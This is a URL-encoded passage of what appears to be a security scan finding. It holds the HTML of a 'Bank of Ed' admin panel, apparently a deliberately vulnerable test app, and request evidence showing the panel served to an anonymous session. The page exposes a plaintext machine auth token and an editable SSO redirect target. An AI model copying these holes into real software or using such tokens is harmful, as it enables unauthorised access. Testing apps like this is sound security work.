2M3%2010h18M7%2015h1m4%200h1m-7%204h12a3%203%200%20003-3V8a3%203%200%2000-3-3H6a3%203%200%2000-3%203v8a3%203%200%20003%203z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3EAccounts%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Ffx-rates%5C%22%20data-nav%3D%5C%22fx-rates%5C%22%20class%3D%5C%22nav-link%20flex%20items-center%20gap-3%20px-4%20py-3%20rounded-xl%20text-dark-300%20hover%3Atext-white%20hover%3Abg-dark-800%20transition-colors%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M12%208c-1.657%200-3%20.895-3%202s1.343%202%203%202%203%20.895%203%202-1.343%202-3%202m0-8c1.11%200%202.08.402%202.599%201M12%208V7m0%201v8m0%200v1m0-1c-1.11%200-2.08-.402-2.599-1M21%2012a9%209%200%2011-18%200%209%209%200%200118%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3EFX%20Rates%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Fsystem%5C%22%20data-nav%3D%5C%22system%5C%22%20class%3D%5C%22nav-link%20flex%20items-center%20gap-3%20px-4%20py-3%20rounded-xl%20text-dark-300%20hover%3Atext-white%20hover%3Abg-dark-800%20transition-colors%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M4%204v5h.582m15.356%202A8.001%208.001%200%20004.582%209m0%200H9m11%2011v-5h-.581m0%200a8.003%208.003%200%2001-15.357-2m15.357%202H15%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3ESystem%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%3C%2Fnav%3E%5Cn%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22p-4%20border-t%20border-dark-800%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-3%20mb-3%20px-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-9%20h-9%20bg-dark-700%20rounded-full%20flex%20items-center%20justify-center%20text-sm%20font-semibold%5C%22%20id%3D%5C%22sidebar-avatar%5C%22%3EA%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22min-w-0%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-sm%20font-medium%20truncate%5C%22%20id%3D%5C%22sidebar-admin-name%5C%22%3EAdmin%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cbutton%20onclick%3D%5C%22BankOfEdAdmin.App.logout()%5C%22%20class%3D%5C%22w-full%20flex%20items-center%20gap-3%20px-4%20py-2.5%20rounded-xl%20text-dark-400%20hover%3Atext-red-400%20hover%3Abg-dark-800%20transition-colors%20text-sm%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M17%2016l4-4m0%200l-4-4m4%204H7m6%204v1a3%203%200%2001-3%203H6a3%203%200%2001-3-3V7a3%203%200%20013-3h4a3%203%200%20013%203v1%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3ESign%20Out%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Faside%3E%5Cn%5Cn%20%20%20%20%3C!--%20Main%20Content%20--%3E%5Cn%20%20%20%20%3Cmain%20class%3D%5C%22flex-1%20overflow-y-auto%20pt-14%20lg%3Apt-0%5C%22%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22p-4%20sm%3Ap-6%20lg%3Ap-8%20max-w-7xl%20mx-auto%5C%22%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20Customers%20List%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-customers%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20justify-between%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-2xl%20font-bold%20text-dark-900%5C%22%3ECustomers%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-500%20mt-1%5C%22%3EManage%20customer%20accounts%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-3%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22text%5C%22%20id%3D%5C%22customer-search%5C%22%20placeholder%3D%5C%22Search...%5C%22%20class%3D%5C%22px-4%20py-2.5%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%20text-sm%20w-48%5C%22%20onkeyup%3D%5C%22BankOfEdAdmin.CustomersPage.handleSearch(event)%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22customers-table%5C%22%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-dark-100%20overflow-hidden%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22customers-pagination%5C%22%20class%3D%5C%22mt-4%20flex%20items-center%20justify-between%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20Customer%20Detail%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-customer-detail%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Fcustomers%5C%22%20class%3D%5C%22inline-flex%20items-center%20gap-1%20text-red-600%20hover%3Atext-red-700%20text-sm%20font-medium%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M15%2019l-7-7%207-7%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20Back%20to%20Customers%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22customer-detail-content%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20Accounts%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-accounts%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-2xl%20font-bold%20text-dark-900%5C%22%3EAll%20Accounts%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-500%20mt-1%5C%22%3EView%20and%20manage%20all%20bank%20accounts%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22accounts-table%5C%22%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-dark-100%20overflow-hidden%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22accounts-pagination%5C%22%20class%3D%5C%22mt-4%20flex%20items-center%20justify-between%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20FX%20Rates%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-fx-rates%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20justify-between%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-2xl%20font-bold%20text-dark-900%5C%22%3EFX%20Rates%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-500%20mt-1%5C%22%3EManage%20foreign%20exchange%20rates%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20onclick%3D%5C%22BankOfEdAdmin.FxRatesPage.showAddModal()%5C%22%20class%3D%5C%22bg-red-600%20hover%3Abg-red-700%20text-white%20font-semibold%20px-5%20py-2.5%20rounded-xl%20transition-colors%20text-sm%20flex%20items-center%20gap-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M12%204v16m8-8H4%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20Add%20Rate%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22fx-rates-table%5C%22%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-dark-100%20overflow-hidden%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20System%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-system%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-2xl%20font-bold%20text-dark-900%5C%22%3ESystem%20Management%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-500%20mt-1%5C%22%3EIntegration%20settings%2C%20database%20operations%20and%20maintenance%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%20%20%3C!--%20White-Label%20Partner%20Settings%20Card%20--%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-dark-100%20p-6%20sm%3Ap-8%20max-w-xl%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-3%20mb-4%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-12%20h-12%20bg-amber-100%20rounded-full%20flex%20items-center%20justify-center%20flex-shrink-0%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-6%20h-6%20text-amber-600%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M13.828%2010.172a4%204%200%2000-5.656%200l-4%204a4%204%200%20105.656%205.656l1.102-1.101m-.758-4.899a4%204%200%20005.656%200l4-4a4%204%200%2000-5.656-5.656l-1.1%201.1%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%20class%3D%5C%22text-xl%20font-bold%20text-dark-900%5C%22%3EFACE%20Insurance%20Integration%3C%2Fh2%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-sm%20text-dark-500%5C%22%3EConfigure%20target%20URL%20for%20White-Label%20Insurance%20SSO%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20id%3D%5C%22insurance-settings-form%5C%22%20onsubmit%3D%5C%22BankOfEdAdmin.SystemPage.saveSettings(event)%5C%22%20class%3D%5C%22space-y-4%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%20class%3D%5C%22block%20text-sm%20font-medium%20text-dark-700%20mb-1.5%5C%22%3EFACE%20Insurance%20Base%20URL%3C%2Flabel%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22url%5C%22%20id%3D%5C%22setting-insurance-url%5C%22%20required%20class%3D%5C%22w-full%20px-4%20py-3%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%20text-sm%5C%22%20placeholder%3D%5C%22http%3A%2F%2Flocalhost%3A8001%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-xs%20text-dark-400%20mt-1.5%5C%22%3EWhen%20customers%20click%20Insurance%2C%20they%20will%20be%20redirected%20to%20this%20URL%20with%20an%20SSO%20assertion%20token.%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22p-3.5%20bg-dark-50%20rounded-xl%20text-xs%20text-dark-600%20space-y-1%20font-mono%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%3Cspan%20class%3D%5C%22font-semibold%20text-dark-800%5C%22%3EMerchant%20ID%3A%3C%2Fspan%3E%20%3Cspan%20id%3D%5C%22setting-merchant-id%5C%22%3Efaceinsurance%3C%2Fspan%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%3Cspan%20class%3D%5C%22font-semibold%20text-dark-800%5C%22%3ESettlement%20Account%3A%3C%2Fspan%3E%20%3Cspan%20id%3D%5C%22setting-merchant-account%5C%22%3E062-001%2088880001%20(face%40example.com)%3C%2Fspan%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%3Cspan%20class%3D%5C%22font-semibold%20text-dark-800%5C%22%3EMachine%20Auth%20Token%3A%3C%2Fspan%3E%20%3Cspan%20id%3D%5C%22setting-machine-token%5C%22%20class%3D%5C%22text-dark-500%5C%22%3Emch_face_insurance_secret_key_2026%3C%2Fspan%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20type%3D%5C%22submit%5C%22%20id%3D%5C%22save-settings-btn%5C%22%20class%3D%5C%22bg-dark-900%20hover%3Abg-dark-800%20text-white%20font-semibold%20px-6%20py-2.5%20rounded-xl%20transition-colors%20text-sm%20flex%20items-center%20justify-center%20gap-2%20disabled%3Aopacity-50%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%3ESave%20Settings%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%20animate-spin%20hidden%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Ccircle%20class%3D%5C%22opacity-25%5C%22%20cx%3D%5C%2212%5C%22%20cy%3D%5C%2212%5C%22%20r%3D%5C%2210%5C%22%20stroke%3D%5C%22currentColor%5C%22%20stroke-width%3D%5C%224%5C%22%20fill%3D%5C%22none%5C%22%3E%3C%2Fcircle%3E%3Cpath%20class%3D%5C%22opacity-75%5C%22%20fill%3D%5C%22currentColor%5C%22%20d%3D%5C%22M4%2012a8%208%200%20018-8V0C5.373%200%200%205.373%200%2012h4z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fform%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%20%20%3C!--%20Reset%20Database%20Card%20--%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-red-200%20p-6%20sm%3Ap-8%20max-w-xl%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-3%20mb-4%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-12%20h-12%20bg-red-100%20rounded-full%20flex%20items-center%20justify-center%20flex-shrink-0%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-6%20h-6%20text-red-600%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M12%209v2m0%204h.01m-6.938%204h13.856c1.54%200%202.502-1.667%201.732-3L13.732%204c-.77-1.333-2.694-1.333-3.464%200L3.34%2016c-.77%201.333.192%203%201.732%203z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%20class%3D%5C%22text-xl%20font-bold%20text-dark-900%5C%22%3EReset%20Database%3C%2Fh2%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-sm%20text-dark-500%5C%22%3EDrop%20and%20recreate%20the%20entire%20database%20with%20seed%20data%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22bg-red-50%20border%20border-red-200%20rounded-xl%20p-4%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-red-800%20text-sm%20font-medium%5C%22%3EWarning%3A%20This%20action%20is%20irreversible%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-red-600%20text-xs%20mt-1%5C%22%3EAll%20customer%20data%2C%20accounts%2C%20and%20transactions%20will%20be%20permanently%20deleted%20and%20replaced%20with%20default%20seed%20data.%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-sm%20text-dark-600%20mb-3%5C%22%3EType%20%3Cstrong%3ERESET%3C%2Fstrong%3E%20below%20to%20confirm%3A%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22text%5C%22%20id%3D%5C%22reset-confirm-input%5C%22%20class%3D%5C%22w-full%20px-4%20py-3%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%20font-mono%20tracking-widest%20text-center%20text-lg%20mb-4%5C%22%20placeholder%3D%5C%22Type%20RESET%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20id%3D%5C%22reset-btn%5C%22%20onclick%3D%5C%22BankOfEdAdmin.SystemPage.handleReset()%5C%22%20class%3D%5C%22w-full%20bg-red-600%20hover%3Abg-red-700%20text-white%20font-semibold%20py-3%20rounded-xl%20transition-colors%20flex%20items-center%20justify-center%20gap-2%20disabled%3Aopacity-50%20disabled%3Acursor-not-allowed%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%3EReset%20Database%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%20animate-spin%20hidden%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Ccircle%20class%3D%5C%22opacity-25%5C%22%20cx%3D%5C%2212%5C%22%20cy%3D%5C%2212%5C%22%20r%3D%5C%2210%5C%22%20stroke%3D%5C%22currentColor%5C%22%20stroke-width%3D%5C%224%5C%22%20fill%3D%5C%22none%5C%22%3E%3C%2Fcircle%3E%3Cpath%20class%3D%5C%22opacity-75%5C%22%20fill%3D%5C%22currentColor%5C%22%20d%3D%5C%22M4%2012a8%208%200%20018-8V0C5.373%200%200%205.373%200%2012h4z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Fmain%3E%5Cn%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%3C!--%20Scripts%20--%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Futils.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fapi.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Frouter.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Fauth.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Fcustomers.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Faccounts.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Fsystem.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Ffx-rates.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fapp.js%5C%22%3E%3C%2Fscript%3E%5Cn%3C%2Fbody%3E%5Cn%3C%2Fhtml%3E%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2Flocalhost%3A8081%2Fadmin%2F%23%2Fcustomers%2F11%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%22%2C%22response_evidence%22%3A%22Status%3A%20200%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A34%3A23%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnlast-modified%3A%20Sun%2C%2023%20Aug%202026%2012%3A34%3A31%20GMT%5Cnetag%3A%20%5C%224c9c-659b6175aa3c0%5C%22%5Cnaccept-ranges%3A%20bytes%5Cncontent-length%3A%2019612%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20text%2Fhtml%5Cn%5Cn%3C!DOCTYPE%20html%3E%5Cn%3Chtml%20lang%3D%5C%22en%5C%22%3E%5Cn%3Chead%3E%5Cn%20%20%3Cmeta%20charset%3D%5C%22UTF-8%5C%22%3E%5Cn%20%20%3Cmeta%20name%3D%5C%22viewport%5C%22%20content%3D%5C%22width%3Ddevice-width%2C%20initial-scale%3D1.0%5C%22%3E%5Cn%20%20%3Ctitle%3EThe%20Bank%20of%20Ed%20-%20Admin%3C%2Ftitle%3E%5Cn%20%20%3Clink%20rel%3D%5C%22preconnect%5C%22%20href%3D%5C%22https%3A%2F%2Ffonts.googleapis.com%5C%22%3E%5Cn%20%20%3Clink%20rel%3D%5C%22preconnect%5C%22%20href%3D%5C%22https%3A%2F%2Ffonts.gstatic.com%5C%22%20crossorigin%3E%5Cn%20%20%3Clink%20href%3D%5C%22https%3A%2F%2Ffonts.googleapis.com%2Fcss2%3Ffamily%3DInter%3Awght%40300%3B400%3B500%3B600%3B700%26display%3Dswap%5C%22%20rel%3D%5C%22stylesheet%5C%22%3E%5Cn%20%20%3Cscript%20src%3D%5C%22https%3A%2F%2Fcdn.tailwindcss.com%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%3E%5Cn%20%20%20%20tailwind.config%20%3D%20%7B%5Cn%20%20%20%20%20%20theme%3A%20%7B%5Cn%20%20%20%20%20%20%20%20extend%3A%20%7B%5Cn%20%20%20%20%20%20%20%20%20%20colors%3A%20%7B%5Cn%20%20%20%20%20%20%20%20%20%20%20%20dark%3A%20%7B%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%2050%3A%20'%23f4f4f5'%2C%20100%3A%20'%23e4e4e7'%2C%20200%3A%20'%23d4d4d8'%2C%20300%3A%20'%23a1a1aa'%2C%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20400%3A%20'%2371717a'%2C%20500%3A%20'%2352525b'%2C%20600%3A%20'%233f3f46'%2C%20700%3A%20'%2327272a'%2C%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20800%3A%20'%2318181b'%2C%20900%3A%20'%2309090b'%2C%20950%3A%20'%23030305'%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%7